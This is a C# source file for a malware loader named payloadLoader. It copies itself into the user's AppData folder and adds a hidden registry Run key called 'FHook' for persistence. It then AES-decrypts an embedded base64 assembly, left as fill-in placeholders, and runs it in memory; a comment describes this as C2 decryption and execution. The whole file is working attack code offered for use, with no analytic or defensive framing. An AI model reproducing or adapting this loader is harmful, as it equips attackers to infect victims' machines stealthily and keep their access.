using System;
using System.IO;
using System.Security.Cryptography;
using System.Reflection;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.Management;
using Newtonsoft.Json;
using System.Collections.Generic;
using System.Security.Cryptography.X509Certificates;
using System.Net.Security;
using System.Security.Authentication;
using System.Diagnostics;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;
using Microsoft.Win32;
using System.ServiceProcess;

public class payloadLoader
{
    public static void Main()
    {
        string newDirectoryPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        string newFilePath = Path.Combine(newDirectoryPath, Path.GetFileName(Assembly.GetExecutingAssembly().Location));

        if (newFilePath != Assembly.GetExecutingAssembly().Location)
        {
            try
            {
                File.Copy(Assembly.GetExecutingAssembly().Location, newFilePath, true);
            }
            catch (IOException ex)
            {
                Console.WriteLine($"An error occurred: {ex.Message}");
                Environment.Exit(0);
            }

            string registryCommand = $"/C reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v FHook /t REG_SZ /d \"{newFilePath}\" /f";

            ProcessStartInfo registryPsi = new ProcessStartInfo()
            {
                FileName = "cmd.exe",
                Arguments = registryCommand,
                UseShellExecute = false,
                RedirectStandardOutput = true,
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden,
            };

            Process registryProc = new Process() { StartInfo = registryPsi };
            registryProc.Start();
           
        }
        // begin c2 decryption, decode and execution via memory
        string base64EncryptedExecutable = "YOUR_BASE64";
        string hexKey = "YOUR_KEY";
        string hexIv = "YOUR_IV";

        byte[] key = HexStringToByteArray(hexKey);
        byte[] iv = HexStringToByteArray(hexIv);

        byte[] encryptedAssemblyBytes = Convert.FromBase64String(base64EncryptedExecutable);

        byte[] assemblyBytes = DecryptBytes(encryptedAssemblyBytes, key, iv);

        Assembly assembly = Assembly.Load(assemblyBytes);

        MethodInfo method = assembly.EntryPoint;
        if (method != null)
        {
            try
            {
                method.Invoke(null, new object[] { new string[] { } });
            }
            catch (TargetInvocationException tie)
            {
                if (tie.InnerException != null)
                {
                    Console.WriteLine($"Inner exception: {tie.InnerException}");
                }
                else
                {
                    throw;
                }
            }
        }
    }

    public static byte[] DecryptBytes(byte[] cipherBytes, byte[] key, byte[] iv)
    {
        byte[] decryptedBytes;
        using (Aes aesAlg = Aes.Create())
        {
            aesAlg.Key = key;
            aesAlg.IV = iv;

            ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);

            using (MemoryStream msDecrypt = new MemoryStream(cipherBytes))
            {
                using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                {
                    using (var srDecrypt = new BinaryReader(csDecrypt))
                    {
                        decryptedBytes = srDecrypt.ReadBytes((int)msDecrypt.Length);
                    }
                }
            }
        }

        return decryptedBytes;
    }

    public static byte[] HexStringToByteArray(string hex)
    {
        int numChars = hex.Length;
        byte[] bytes = new byte[numChars / 2];
        for (int i = 0; i < numChars; i += 2)
        {
            bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
        }
        return bytes;
    }
}
